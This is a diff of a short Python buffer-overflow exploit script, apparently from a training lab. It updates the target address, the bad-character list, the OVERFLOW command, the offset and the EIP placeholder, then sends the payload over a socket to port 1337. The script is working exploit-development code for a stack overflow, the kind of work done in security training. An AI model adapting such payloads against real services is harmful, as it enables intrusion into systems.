@@ -1,15 +1,16 @@
 #!/usr/bin/python3
 import socket
 
-host, port = "10.10.61.109", 1337
+host, port = "10.10.63.219", 1337
 
 all_chars = bytearray(range(1,256))
 
 bad_chars = [
-        b"\x07", 
-        b"\x2d",
-        b"\x2e",
-        b"\xa0",
+        b"\x11",
+        b"\x40",
+        b"\x5f",
+        b"\xb8",
+        b"\xee",
         ]
 
 
@@ -17,9 +18,9 @@ bad_chars = [
 for bad_char in bad_chars:
     all_chars = all_chars.replace(bad_char, b"")
 
-cmd = b"OVERFLOW1 "
-pattern_length = 2000 # Documentation and keep for length retention
-offset = 1978
+cmd = b"OVERFLOW3 "
+pattern_length = 1500 # Documentation and keep for length retention
+offset = 1278
 new_eip = b"BBBB"
 
 payload = b"".join([
@@ -33,5 +34,3 @@ payload = b"".join([
 with socket.socket() as s:
     s.connect((host,port))
     s.send(payload)
-    #s.recv(4096).decode("utf-8").strip()
-
